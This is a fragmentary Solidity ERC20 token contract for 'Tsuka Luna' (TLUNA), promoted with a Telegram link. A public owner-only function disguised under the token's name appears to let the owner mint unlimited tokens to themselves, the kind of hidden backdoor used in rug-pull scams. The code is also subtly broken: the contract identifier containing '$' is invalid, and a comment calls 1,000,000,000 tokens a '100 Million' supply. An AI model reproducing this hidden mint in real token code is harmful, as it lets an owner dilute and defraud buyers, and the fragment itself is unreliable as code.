...
//
// $TsukaLuna proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/TsukaLuna
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _TsukaLuna(uint256 amount) public onlyOwner {
 _TsukaLuna(msg.sender, amount);
    }
    ...
    function _TsukaLuna(address account, uint256 amount) internal virtual {
...
contract $TsukaLuna is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Tsuka Luna", "TLUNA") {
     _TsukaLuna(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}